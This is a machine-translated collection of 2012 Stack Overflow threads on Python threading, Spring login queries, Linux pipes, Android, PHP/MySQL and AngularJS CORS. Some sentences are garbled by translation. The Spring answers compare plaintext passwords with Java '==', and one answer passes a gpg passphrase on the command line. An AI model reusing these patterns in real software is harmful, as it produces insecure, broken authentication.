不是线程安全的操作。当多个线程试图增加一个共享的全局变量时，可能会发生冲突并且`successful`不会正确地增加。

为避免此错误，请使用锁：

```
lock = threading.Lock()
def foo():
    global successful
    while True:
        ...
        with lock:
            successful+=1 
```

* * *

下面是一些代码来证明 x += 1 不是线程安全的：

```
import threading
lock = threading.Lock()
x = 0
def foo():
   global x
   for i in xrange(1000000):
       # with lock:    # Uncomment this to get the right answer
            x += 1
threads = [threading.Thread(target=foo), threading.Thread(target=foo)]
for t in threads:
    t.daemon = True    
    t.start()
for t in threads:
    t.join()

print(x) 
```

产量：

```
% test.py 
1539065
% test.py 
1436487 
```

这些结果不一致并且小于预期的 2000000。取消注释锁定会产生正确的结果。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-08-02T22:21:47.163

问题的发生是因为在函数内部分配的变量被认为是该函数的本地变量。如果要修改在 a`successfull`之外创建的变量的值，则`foo`需要明确通知解释器您将在函数内使用全局变量。这可以通过以下方式完成：

```
def foo():
    global successfull
    while True:
        task=q.get()
        #do some work
        print task
        successful+=1 # triggers an error
        q.task_done() 
```

现在代码应该按预期工作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-02T22:21:23.730

基于[Python 变量范围错误](https://stackoverflow.com/questions/370357/python-variable-scope-question)，

我应该把“全球成功”放在“def foo():”下。

哎呀。

# java - Spring MVC 3.0 从 Sql 查询中获取值

> ID：11786534
> 
> 赞同：0
> 
> 时间：2012-08-02T22:07:23.330
> 
> 标签：java, sql, spring, parameters, resultset

我是使用 Spring MVC 3.0 的新手。我正在编写一个自定义身份验证类，我想知道如何将 SQL 查询中的值提取到变量中？这是我要实现的目标的示例，并且省略了我要询问的一些代码；

```
import java.sql.ResultSet;
import java.sql.SQLException;

import org.apache.log4j.Logger;
import org.springframework.jdbc.core.simple.ParameterizedRowMapper;
import org.springframework.jdbc.core.support.JdbcDaoSupport;

import com.crimetrack.DAO.LoginDAO;
import com.crimetrack.business.Login;

public class JdbcLoginDAO extends JdbcDaoSupport implements LoginDAO {

    private final Logger logger = Logger.getLogger(getClass()); 
    String dbUserName;
    String dbPassword;

    public boolean AuthenticateUser(Login login) {
        logger.debug("Authenticating User");

        String sql = "SELECT userName, password FROM tblofficers WHERE userName = :userName AND password = :password ";

        //code for parameters : userName and password using login.getPassword() and login.getUsername()
        //and code to get vaules out from query for comparison

        if (dbUserName == login.getUserName()) {

            if (dbPassword == login.getPassword()){
                return true;
            }
        }

        return false;

    }

    public static class LoginMapper implements ParameterizedRowMapper<Login>{

         public Login mapRow(ResultSet rs, int rowNum) throws SQLException {
                Login dbLogin = new Login();
                dbLogin.setUserName(rs.getString("userName"));
                dbLogin.setPassword(rs.getString("password"));
                return dbLogin;
            }       
    }

} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-02T13:07:03.390

使用 JDBCTemplate 和 BeanPropertyRowMapper 将查询作为“登录”类的另一个实例返回，然后比较对象。

您必须查看 JDBCTemplate 来定义数据库连接，但最终看起来像：

```
UserLogin authenticLogin = (UserLogin) db_connection.queryForObject(sql, new BeanPropertyRowMapper(UserLogin.class));

if (userLogin.getPassword() == authenticLogin.getPassword()) {
    return true
} 
```

基本上，BeanPropertRowMapper 将创建一个类的新实例，设置与查询返回的列同名的任何属性。

# java - 有没有更好的方法来切换注释代码？

> ID：11786535
> 
> 赞同：2
> 
> 时间：2012-08-02T22:07:32.283
> 
> 标签：java, comments, line, toggle, block

如果我有两段代码并且我想在它们之间切换（例如，出于测试目的），我意识到你可以使用这样的注释：

```
//*
<chunk #1, active code here>
//*/

/*
<chunk #2, commented out code here>
//*/ 
```

然后要在它们之间切换，我只需要在`/`#2 上面添加一个并从#1 上面删除一个`/`。我知道 IDE 有“切换评论”命令，但我认为这更快且不那么混乱。

```
/*
<chunk #1, active code here>
//*/

//*
<chunk #2, commented out code here>
//*/ 
```

这显然有效，因为行注释实际上注释掉了`/*`所以块注释没有被解析，并且`//`实际上注释掉`*/`.

我的问题是，是否有更好的方法来做这样的评论，或者这种方法是否像评论一样“巧妙”？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-02T22:18:53.760

首先让我说我认为使用斜线和星号的神秘系统来切换代码是邪恶的，但无论如何让我们尝试一下。

**选择的第一个块**

```
//*
public static void doStuff()
{
    System.out.println("foo");
}
/*/
public static void doStuff()
{
    System.out.println("bar");
}
//*/ 
```

**选择第二个块**（唯一的变化是删除第一个斜杠）：

```
/*
public static void doStuff()
{
    System.out.println("foo");
}
/*/
public static void doStuff()
{
    System.out.println("bar");
}
//*/ 
```

它之所以起作用，是因为`/*/`中间的它可以作为打开或关闭注释块的功能，具体取决于是否存在已打开的注释块。

它类似于您自己的方法，但优点是您可以通过仅更改单个字符来切换，而不必更改两个字符。所以这是一种更有效的作恶方式。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-02T22:12:24.357

一种方法是这样的：

```
public class DebugOptions {
  public static final boolean DEBUG_FLAG = true;
}; 
```

然后在你的函数中，你可以有如下代码：

```
if(DebugOptions.DEBUG_FLAG) {
  // Do some debugging stuff
} else {
  // Do something else
} 
```

或者，每个类都可以有自己的标志，但模式是相同的。此外，您可能希望拥有多个标志或`enum`提供不同级别的调试服务。

当您将布尔标志设置为 false 时，大多数编译器将优化掉任何未执行的代码。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-02T22:19:11.987

乱七八糟，你的代码不可读。使用 IDE 功能，它需要按两次热键。1或2秒这不是经济。

更好的调试方法具有包装器方法，该方法允许根据参数有时使用其中一种方法。

```
void debug(Mode m) {
  switch m : {
    case M1: method1();
    case M2: method2();
    ...
  }
} 
```

在代码中调用它`debug(M1)`。如果您真的关心速度，您只需将 1 从 2 更改。

# apache - 没有权限，禁止访问-codeigniter

> ID：11786537
> 
> 赞同：1
> 
> 时间：2012-08-02T22:07:42.190
> 
> 标签：apache, .htaccess, codeigniter

在主控制器中调用某个函数后，我在使用 CodeIgniter 的登录教程时遇到了一个小问题，出现此错误：

禁止访问！

您无权访问请求的对象。它要么是读保护的，要么是服务器不可读的。

如果您认为这是服务器错误，请联系网站管理员。

我在 Mac 上使用 XAMPP，但不确定出了什么问题.. 虽然 htaccess CodeIgniter 为我提供了这个“拒绝所有人”

如何通过 xampp 更改本地主机的权限？都需要777吗？还是我的 htaccess 错了？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-02T22:14:46.680

它是 baseurl，永远不要添加 /application/，因为我学到了一个艰难的方法，即应用程序中的所有内容都受到了 htaccess 的保护，因此人们无法访问核心文件！感谢 CODEIGNITER 如此安全 :)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-03-01T18:38:14.230

我想你不再有那个错误了，我刚刚有了它，并在获得许可的情况下修复了它。

```
root: ls -lrht
....
-rwxr-xr-x@   1 root     admin   199B Mar  1 13:34 .htaccess
...
root: chown jcho360 .htaccess 
root: ls -lrth
t...
-rwxr-xr-x@   1 jcho360  admin   199B Mar  1 13:34 .htaccess
...
root: 
```

在此之后，它工作完美

# uml - 如何在 Dia 中绘制自调用？

> ID：11786539
> 
> 赞同：11
> 
> 时间：2012-08-02T22:07:54.390
> 
> 标签：uml, dia

我刚开始使用 Dia。我正在尝试构建一个序列图。我想代表自我调用。在 Dia 怎么做到这一点？我想不通。

谢谢。

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-08-08T14:58:34.180

首先放置一个UML Message 对象，它的基础连接到您的生命线。

然后，双击箭头（或右键单击，属性），并将消息类型下拉字段更改为递归，您将得到如下内容：

![在此处输入图像描述](../Images/3ee4ac52f7bfad816036a28cc12377cb.png)

现在您可以拖动绿色锚点，使消息箭头看起来像您想要的那样。（注意事项：似乎对于递归消息对象，您只能通过在绿色锚点所在的位置单击该对象来选择该对象。我说“将是”，因为您当然看不到未选择对象时的绿色锚点。）

如果您愿意，您可以创建另一个 UML 生命线对象，并将其与现有生命线重叠，如下所示：

![额外的生命线示例](../Images/b12ef34991a0a3d0ee8a53806c163b4f.png)

然而，这并不理想，因为这第二条生命线实际上没有任何东西。Recursive Message 对象不允许您选择在何处附加它的箭头，因为它会自动附加到它起源的生命线。而且因为第二条生命线没有连接任何东西，如果你在它周围移动物体，它就会被抛在后面。但是，它看起来确实很漂亮，如果这就是你所追求的。:)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-10T11:29:54.780

UML 中的自调用（或任何其他关联）最好使用标准关联表示法而不是消息一表示。在 DIA 中，从左侧的工具箱中插入关联符号并将其添加到您的画布中。然后为了让它递归地连接一个类（到自己）双击它并单击选择“自动路由”作为否。这将使您能够自己塑造路线，并且不会将您限制在将类链接到自身时绘制的自动直线。

你最终会得到这样的东西（在这个例子中，它是链表中节点的表示）： ![在此处输入图像描述](../Images/abc3a8afbff0f42acff1d8e8f9009edd.png)

# iphone - Apple Transit API 集成

> ID：11786540
> 
> 赞同：-1
> 
> 时间：2012-08-02T22:07:56.233
> 
> 标签：iphone, ios, ios6

我听说了很多关于苹果新交通 API 的信息。我想将其集成到我的应用程序中。我基本上是想在用户附近找到公交信息的地理位置信息。

有谁知道这是否可能？还是出于完全不同的目的？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T22:19:41.167

这是一个 iOS 6 api，处于测试阶段 - 因此您和我们不能在公共论坛上讨论它，它违反了您作为 Apple 开发人员的 NDA。

但是，您可以通过他们的支持渠道询问 Apple。

# linux - 具有多个要求用户输入的程序的 linux 管道

> ID：11786543
> 
> 赞同：6
> 
> 时间：2012-08-02T22:08:05.480
> 
> 标签：linux, bash, pipe

我想知道如何创建管道

```
program 1 | ... | program N 
```

其中多个程序要求用户输入。问题是`|`并行启动程序，因此它们开始从终端并行读取。

`|`对于这种情况，只有在程序 i 产生了一些输出之后才启动程序 (i+1)的管道会很有用。

**编辑：**

例子：

```
cat /dev/sda | bzip2 | gpg -c | ssh user@host 'cat > backup' 
```

在这里既要输入密码，也要输入密码`gpg -c`。`ssh`

此特定示例的解决方法是创建 ssh 密钥对，但这并非在每个系统上都可行，我想知道是否有通用解决方案。gpg 还允许将密码短语作为命令行参数传递，但出于安全原因不建议这样做。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-03T08:20:42.583

您可以使用这种结构：

```
(read a; echo "$a"; cat) > file 
```

例如：

```
$ (read a; echo "$a"; echo cat is started > /dev/stderr; cat) > file
1
cat is started
2
3 
```

在这里`1`，`2`和`3`是从键盘输入的；`cat is started`是由回声写的。

`file`命令执行后的内容：

```
$ cat file
1
2
3 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-03T09:47:51.883

我现在正在使用：

```
#!/bin/bash
sudo echo "I am root!"
sudo cat /dev/disk0 | bzip2 | gpg -c | (read -n 1 a; (echo -n "$a"; cat) | ssh user@host 'cat > backup') 
```

第一个`sudo`将阻止第二个再次询问密码。如上所述，`read`推迟了 ssh 的启动。因为我不想等待换行符，所以我使用`-n 1`了for来抑制换行符。`read``-n``echo`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-03T08:29:51.683

对于一个，您可以使用该`--passphrase`选项为 gpg 提供密码。

对于 ssh，*最好*的解决方案是按键登录。但是，如果您需要通过密码进行操作，则该`expect`命令会很好。这是一个很好的例子：[在 bash 脚本中使用 expect 来为 SSH 命令提供密码](https://stackoverflow.com/questions/4780893/use-expect-in-bash-script-to-provide-password-to-ssh-command)

Expect 还允许您进行一些输入 - 因此，如果您不想硬编码您的密码，这可能是要走的路。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-02T00:24:17.247

我以前需要类似的东西几次，管道中的第一个命令需要输入密码，而下一个命令不会自动满足这个要求（就像`less`那样）。

与 Igor 的回复类似，我发现在子shell 中使用 read 很有用：

```
cmd1 | ( read; cat - | cmd2 ) 
```

# java - 如何使用 java 在 Flash Web 应用程序中触发事件？

> ID：11786546
> 
> 赞同：0
> 
> 时间：2012-08-02T22:08:16.410
> 
> 标签：java, flash

除了机器人类之外，如何使用 java 触发 Flash 动画中的按钮和其他输入？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-03T14:43:32.137

如果 Flash 客户端不知道您的 Java 后端，那么您就没有特殊的方法可以做到这一点。有一些脚本环境允许您模仿键盘和鼠标输入，例如 Xdotool，但它和 Java 并没有什么特别之处，它只是一个具有自己脚本语言的外部仿真器工具。另请注意，Flash 需要 X-server（window-server）才能运行，因此如果需要在无头服务器上运行它，这可能会有点问题...

# android - 加载列表视图图像在滚动时混淆

> ID：11786548
> 
> 赞同：0
> 
> 时间：2012-08-02T22:08:35.870
> 
> 标签：android, bitmap

当我从 SD 卡加载图像并将它们显示在我的列表视图中时，我遇到了问题。它们最初加载得很好，但是当我开始上下滚动时，图像会全部变大，而不是与相应列表项一起使用的图像

这是我做所有事情的适配器

```
@Override
    public void bindView(final View view,final Context context,final Cursor cursor){
        final int id = cursor.getInt(0);;
        final QuickContactBadge image = (QuickContactBadge)view.findViewById(R.id.quickContactBadge1);
        image.setOnClickListener(new View.OnClickListener(){

            @Override
            public void onClick(View v) {
                if(!fromGame){
                    bowlerID = id;
                    Intent i = new Intent(Intent.ACTION_PICK,android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI);
                    startActivityForResult(i,1);
                }
            }

        });
        String uri = cursor.getString(3);
        if(uri != null){
            image.setImageResource(R.drawable.ic_contact_picture);
            new LoadImage().execute(new Object[]{uri,image});
        }else{

        }

        TextView first = (TextView)view.findViewById(R.id.bListTextView);
        TextView last = (TextView)view.findViewById(R.id.bListTextView2);
        first.setText(cursor.getString(1));
        last.setText(cursor.getString(2));
    } 
```

和我的`AsyncTask`，我给出了图像将显示的视图和图像的 uri

```
public class LoadImage extends AsyncTask<Object,Void,Object[]>{

    @Override
    protected Object[] doInBackground(Object... params) {
        String u = (String) params[0];

        InputStream input=null;
        try {
            input = getActivity().getContentResolver().openInputStream(Uri.parse(u));
            BitmapFactory.Options options = new BitmapFactory.Options();
            options.inJustDecodeBounds = false;
            Bitmap og = BitmapFactory.decodeStream(input,null,options);
            int height = options.outHeight;
            int width = options.outWidth;
            BitmapFactory.decodeResource(getResources(), R.drawable.ic_contact_picture, options);

            int imageHeight = options.outHeight;
            int imageWidth = options.outWidth;
            try {
                input.close();
            } catch (IOException e) {
                e.printStackTrace();
            }

            float scaledHeight = ((float)imageHeight)/height;
            float scaledWidth = ((float)imageWidth)/width;

            Matrix matrix = new Matrix();
            matrix.postScale(scaledWidth, scaledHeight);

            Bitmap resize = Bitmap.createBitmap(og, 0, 0, width, height, matrix, true);
            try {
                input.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
            return new Object[] {resize,params[1]};    
        } catch (FileNotFoundException e) {
            e.printStackTrace();
            return null;
        }
    }

    @Override
    public void onPostExecute(Object[] params){ 
        Bitmap resizedImage = (Bitmap)params[0];
        QuickContactBadge image = (QuickContactBadge) params[1];
        image.setImageBitmap(resizedImage);
    }

} 
```

我猜这与处理图像有关，`AsyncTask`但我该如何解决呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-09T19:32:00.597

我忘记设置默认图像了

```
image.setImageResource(R.drawable.ic_contact_picture); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T23:15:48.633

我认为 ListView 回收器有问题。当您使用 ListView 滚动时，ListView 适配器始终只加载显示的行 (n)，当您向下移动时，第一个位置被回收为 n+1 位置。所以问题是你开始为第一个位置加载图像然后向下滚动，现在第一个位置是滚动 ListView 中的第二个位置。
出路是检查加载的图像是否应该使用某种行 ID 放置在行中。您还可以使用像 Aquery 这样的 ImageLoader 库来为您完成这项工作。

# android - 更改 android 字体不起作用

> ID：11786553
> 
> 赞同：5
> 
> 时间：2012-08-02T22:09:07.370
> 
> 标签：android, fonts, typeface

我正在使用以下代码行来更改`android`应用程序中的字体类型：L

```
Typeface font = Typeface.createFromAsset(this.getAssets(), "fonts/Abumohammed.ttf"); 
textView.setTypeface(font); 
```

我确定它`Abumohammed.ttf`在`assets/fonts`文件夹中..但字体不会改变并且对 textview 没有任何影响！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-02T22:21:22.493

Android 不支持所有字体文件。当它失败时，它往往会默默地失败，而是显示默认字体。我不知道 Android 不喜欢其中的一些。

我会找到一些绝对有效的字体，[例如 this one](https://github.com/commonsguy/cw-omnibus/blob/master/Fonts/FontSampler/assets/fonts/HandmadeTypewriter.ttf)，并尝试它以确保您的代码的其余部分正常。如果您确实确定字体文件不起作用，AFAIK 您别无选择，只能找到其他字体。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-08-28T21:22:42.753

我对此感到非常恼火，以至于我想我会分享一些我的挖掘结果。我尝试了一些最终使用后备字体的字体文件。要“修复”其中一些文件，我只需要在 FontForge 中打开文件，然后 File->Generate Font 并重新保存为 TTF。这允许一些没有显示正确绘制。

其他人需要将字形从 Microsoft 区域 (U+F030) 移动到 U+0030 范围。

我还没有对“生成字体”的实际作用进行自我教育。但是，既然我知道如何修复它，我至少可以开始弄清楚它为什么不起作用。我怀疑这只能在 AOSP 树中修复。

# android - Android 的 RSS 阅读器问题

> ID：11786556
> 
> 赞同：0
> 
> 时间：2012-08-02T22:09:27.700
> 
> 标签：android, rss

我正在尝试从网站读取 RSS 提要并将它们显示在我的 android 应用程序中。但是，我遇到了错误。有任何想法吗？我将在代码之后发布我的 logcat。请帮忙。

```
package nidhin.rss;

import java.io.IOException;
import java.io.InputStream;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

import org.xmlpull.v1.XmlPullParser;
import org.xmlpull.v1.XmlPullParserException;
import org.xmlpull.v1.XmlPullParserFactory;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;

public class RssActivity extends Activity {
/** Called when the activity is first created. */

Button ButtonStats ;
List headlines;

public void onCreate(Bundle savedInstanceState) 
{
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);
    ButtonStats = (Button) findViewById(R.id.ButtonStats);
    ButtonStats.setOnClickListener(new clicker());
    headlines = new ArrayList();

    try {

    URL url = new URL("http://feeds.pcworld.com/pcworld/latestnews");

    XmlPullParserFactory factory = XmlPullParserFactory.newInstance();
    factory.setNamespaceAware(false);
    XmlPullParser xpp = factory.newPullParser();

    xpp.setInput(getInputStream(url), "UTF_8");

    boolean insideItem = false;
    int eventType = xpp.getEventType();

   while (eventType != XmlPullParser.END_DOCUMENT) 
    {

     if (eventType == XmlPullParser.START_TAG) 
            {
             if (xpp.getName().equalsIgnoreCase("item")) 
                    {

                        insideItem = true;

                    } 

             else if (xpp.getName().equalsIgnoreCase("title")) 
                    {
                      if (insideItem)
                      headlines.add(xpp.nextText()); //extract the headline

                    } 

              }
             else if(eventType==XmlPullParser.END_TAG &&              xpp.getName().equalsIgnoreCase("item"))
                {

                    insideItem=false;

                }

         eventType = xpp.next(); //move to next element

     }

    } catch (MalformedURLException e) {

            e.printStackTrace();

        } catch (XmlPullParserException e) {

            e.printStackTrace();

        } catch (IOException e) {

            e.printStackTrace();

        }

}

public InputStream getInputStream(URL url) {

       try {

           return url.openConnection().getInputStream();

       } catch (IOException e) {

           return null;

         }

    }

class clicker implements Button.OnClickListener
{
        public void onClick(View v)
        {                        
            if(v== ButtonStats)
            {

            }
    }

   }
} 
```

日志猫：

```
08-02 21:40:02.320: E/AndroidRuntime(723): FATAL EXCEPTION: main
08-02 21:40:02.320: E/AndroidRuntime(723): java.lang.RuntimeException: Unable to start activity ComponentInfo{nidhin.rss/nidhin.rss.RssActivity}: android.os.NetworkOnMainThreadException
08-02 21:40:02.320: E/AndroidRuntime(723):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1956)
08-02 21:40:02.320: E/AndroidRuntime(723):  at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:1981)
08-02 21:40:02.320: E/AndroidRuntime(723):  at android.app.ActivityThread.access$600(ActivityThread.java:123)
08-02 21:40:02.320: E/AndroidRuntime(723):  at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1147)
08-02 21:40:02.320: E/AndroidRuntime(723):  at android.os.Handler.dispatchMessage(Handler.java:99)
08-02 21:40:02.320: E/AndroidRuntime(723):  at android.os.Looper.loop(Looper.java:137)
08-02 21:40:02.320: E/AndroidRuntime(723):  at android.app.ActivityThread.main(ActivityThread.java:4424)
08-02 21:40:02.320: E/AndroidRuntime(723):  at java.lang.reflect.Method.invokeNative(Native Method)
08-02 21:40:02.320: E/AndroidRuntime(723):  at java.lang.reflect.Method.invoke(Method.java:511)
08-02 21:40:02.320: E/AndroidRuntime(723):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:784)
08-02 21:40:02.320: E/AndroidRuntime(723):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551)
08-02 21:40:02.320: E/AndroidRuntime(723):  at dalvik.system.NativeStart.main(Native Method)
08-02 21:40:02.320: E/AndroidRuntime(723): Caused by: android.os.NetworkOnMainThreadException
08-02 21:40:02.320: E/AndroidRuntime(723):  at android.os.StrictMode$AndroidBlockGuardPolicy.onNetwork(StrictMode.java:1099)
08-02 21:40:02.320: E/AndroidRuntime(723):  at java.net.InetAddress.lookupHostByName(InetAddress.java:391)
08-02 21:40:02.320: E/AndroidRuntime(723):  at java.net.InetAddress.getAllByNameImpl(InetAddress.java:242)
08-02 21:40:02.320: E/AndroidRuntime(723):  at java.net.InetAddress.getAllByName(InetAddress.java:220)
08-02 21:40:02.320: E/AndroidRuntime(723):  at libcore.net.http.HttpConnection.<init>(HttpConnection.java:71)
08-02 21:40:02.320: E/AndroidRuntime(723):  at libcore.net.http.HttpConnection.<init>(HttpConnection.java:50)
08-02 21:40:02.320: E/AndroidRuntime(723):  at libcore.net.http.HttpConnection$Address.connect(HttpConnection.java:351)
08-02 21:40:02.320: E/AndroidRuntime(723):  at libcore.net.http.HttpConnectionPool.get(HttpConnectionPool.java:86)
08-02 21:40:02.320: E/AndroidRuntime(723):  at libcore.net.http.HttpConnection.connect(HttpConnection.java:128)
08-02 21:40:02.320: E/AndroidRuntime(723):  at libcore.net.http.HttpEngine.openSocketConnection(HttpEngine.java:308)
08-02 21:40:02.320: E/AndroidRuntime(723):  at libcore.net.http.HttpEngine.connect(HttpEngine.java:303)
08-02 21:40:02.320: E/AndroidRuntime(723):  at libcore.net.http.HttpEngine.sendSocketRequest(HttpEngine.java:282)
08-02 21:40:02.320: E/AndroidRuntime(723):  at libcore.net.http.HttpEngine.sendRequest(HttpEngine.java:232)
08-02 21:40:02.320: E/AndroidRuntime(723):  at libcore.net.http.HttpURLConnectionImpl.getResponse(HttpURLConnectionImpl.java:273)
08-02 21:40:02.320: E/AndroidRuntime(723):  at libcore.net.http.HttpURLConnectionImpl.getInputStream(HttpURLConnectionImpl.java:168)
08-02 21:40:02.320: E/AndroidRuntime(723):  at nidhin.rss.RssActivity.getInputStream(RssActivity.java:107)
08-02 21:40:02.320: E/AndroidRuntime(723):  at nidhin.rss.RssActivity.onCreate(RssActivity.java:47)
08-02 21:40:02.320: E/AndroidRuntime(723):  at android.app.Activity.performCreate(Activity.java:4465)
08-02 21:40:02.320: E/AndroidRuntime(723):  at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1049)
08-02 21:40:02.320: E/AndroidRuntime(723):  at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1920)
08-02 21:40:02.320: E/AndroidRuntime(723):  ... 11 more 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T22:45:04.290

```
Caused by: android.os.NetworkOnMainThreadException 
```

堆栈跟踪中的那一行告诉您您正在尝试从主线程进行网络调用（获取 RSS）。从 API 11（？我认为）开始，这将引发异常。

这是平台设计人员试图告诉您您确实应该在后台线程上进行网络操作的方式。

要解决此问题，您需要将网络调用移出主线程。您可以使用[Thread](http://developer.android.com/reference/java/lang/Thread.html) / [Handler](http://developer.android.com/reference/android/os/Handler.html)或[AsyncTask](http://developer.android.com/reference/android/os/AsyncTask.html)来实现这一点

[Lars Vogel 的本教程是对两者的精彩概述](http://www.vogella.com/articles/AndroidPerformance/article.html)

# php - 我使用准备好的语句获取 MySql 数据的方法效率低下并且对我的服务器征税吗？

> ID：11786560
> 
> 赞同：1
> 
> 时间：2012-08-02T22:09:41.780
> 
> 标签：php, mysql, performance, mysqli, prepared-statement

今天我们公司的一位资深人士告诉我，我为在 MySQL 数据库上执行准备好的语句而编写的 PHP 代码“效率低下”并且“对我们的服务器负担过重”。从那时起，我发现自己处于试图理解他的意思然后解决它的困难境地。我已经四天没有联系到那个人了，所以我问其他开发人员他们对我的代码的看法，以及是否有任何区域可能导致服务器性能出现瓶颈或问题。

我的代码可以工作并在变量 $data 中返回我的查询结果，所以从技术上讲它可以工作。还有另一个问题是它是否有效并且写得好。关于该高级员工的意思或所指的任何建议？这是我用来连接和查询我们的数据库的方法。

（请注意，当我使用“方法”这个词时，我并不是指类中的方法。我的意思是这就是我在连接和查询数据库时编写/构造代码的方式。）

```
<?php

// Create database object and connect to database
$mysqli=new mysqli();
$mysqli->real_connect($hostname, $username, $password, $database);

// Create statement object
$stmt=$mysqli->stmt_init();

// Prepare the query and bind params
$stmt->prepare('SELECT `col` FROM `table` WHERE `col` > ?');
$stmt->bind_param('i', $var1);

// Execute the query
$stmt->execute();

// Store result
$stmt->store_result();

// Prepare for fetching result
$rslt=array();
$stmt->bind_result($rslt['col']);

// Fetch result and save to array
$data=array();
while($stmt->fetch()){
    foreach($rslt as $key=>$value){
        $row[$key]=$value;
    } 
    $data[]=$row;
}

// Free result
$stmt->free_result();

// Close connections
$stmt->close();
$mysqli->close();

?> 
```

任何建议或建议都是有用的，即使您只是猜测，也请做出贡献并提供帮助。提前致谢 ：）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T22:32:13.923

有两种类型的代码可能效率低下，PHP 代码和 SQL 代码，或两者兼而有之。

例如，如果 `col` 列未在数据库中建立索引，则 SQL 会出现问题。这会给数据库带来大量负载，因为数据库必须扫描很多行来回答查询。如果 `col` 没有在给定查询中建立索引，则将扫描表中的所有行。此外，如果传入的值不是很有选择性，则必须检查许多行，也许是所有行，因为当检查许多行时，MySQL 将选择表扫描而不是索引扫描。您将需要熟悉 MySQL EXPLAIN 计划功能来修复您的查询，或向数据库添加索引以支持您的查询。

如果您遵循以下模式，PHP 将是一个问题：

```
select invoice_id from invoices where customer_id = ?
for each invoice_id
   select * from line_items where invoice_id = ? 
```

这种模式会导致“过度查询”数据库，这会给它带来额外的负载。
而是使用连接：

```
select li.* from invoices i join line_items li using (invoice_id) 
```

请您的数据库管理员打开慢查询日志，然后使用[pt-query-digest处理它](http://www.percona.com/doc/percona-toolkit/2.1/pt-query-digest.html)

您可以使用 pt-query-digest 报告昂贵的查询（需要很长时间才能执行），也可以使用它按频率报告以检测过度查询。

# android - glDiscardFrameBufferEXT 在 Android 中未定义，是否有等价物？

> ID：11786561
> 
> 赞同：1
> 
> 时间：2012-08-02T22:09:42.693
> 
> 标签：android, opengl-es, android-ndk

我目前正在将框架（OpenGL ES 1.1，带扩展）转换为 Android。麻烦的是，框架使用帧缓冲区，但 glDiscardFramebufferEXT 返回一个未定义的错误。

我的 Android.mk 使用 -DGL_GLEXT_PROTOTYPES 来获取 GL 扩展（任何带有 OES 标签的东西）。

有解决方法吗？还是我必须在此处进行特定于 Android 的更改？（或者也许我只是错过了一些东西。）

（这个框架与 IOS 兼容，所以我认为 GL 代码会相似，如果不完全相同的话。）

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-03T03:15:29.947

DiscardFramebuffer 是对 OpenGL 驱动程序的一个性能提示：它总是可以被简单地删除或忽略而不会产生明显的影响。

如果分机不可用，那么您可以删除呼叫。

# asp.net-web-api - AngularJS + ASP.NET Web API 跨域问题

> ID：11786562
> 
> 赞同：12
> 
> 时间：2012-08-02T22:09:48.450
> 
> 标签：asp.net-web-api, angularjs

继续我的移动应用程序开发学习过程，我发现了一个新障碍：跨域请求共享或 CORS。

我正在使用 AngularJS + jQuery Mobile（Cordova 电话客户端）和 ASP.NET Web API（后端）的组合。我的问题是我无法完成对 API 控制器的 POST 请求（或任何其他类型的请求）。

我的 AngularJS 控制器使用`$http.post()`service 方法来调用 Web API 控制器。但是，Chrome 调试器说调用在 OPTIONS 请求（可能是 CORS 预检请求）中失败。

我已经从以下帖子中实现了 CORS 操作选择器：[在 Web API 项目中启用 CORS](http://code.msdn.microsoft.com/windowsdesktop/CORS-support-in-ASPNET-Web-01e9980a)。即使很难，我也可以从 Fiddler 调用 api 方法，AngularJS 在 OPTIONS 预检请求上一直失败。

关于 AngularJS 和跨域调用，我有什么需要注意的吗？我的困境有什么可能的解决方案吗？

谢谢。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2014-02-13T09:39:35.953

您可以使用 content-type 跳过预检选项请求：application/x-www-form-urlencoded。

**AngularJS：**

```
var user = {
   ID: 1,
   Name: 'test'
};

$http({
  url: "api.localhost/api/users/addUser",
  method: "POST",
  data: $.param(user),
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  withCredentials: true,
  }).success(function (data, status, headers, config) {
     console.log(data);
}) 
```

**网络接口：**

```
[HttpPost]
public string AddUser(User user)
{
    // Do something
    return user.Name + " added";
} 
```

**网页配置**

```
 <system.webServer>
        <validation validateIntegratedModeConfiguration="false" />
            <handlers>
                <remove name="ExtensionlessUrlHandler-ISAPI-4.0_32bit" />
                <remove name="ExtensionlessUrlHandler-ISAPI-4.0_64bit" />
                <remove name="ExtensionlessUrlHandler-Integrated-4.0" />
                <remove name="OPTIONSVerbHandler" />
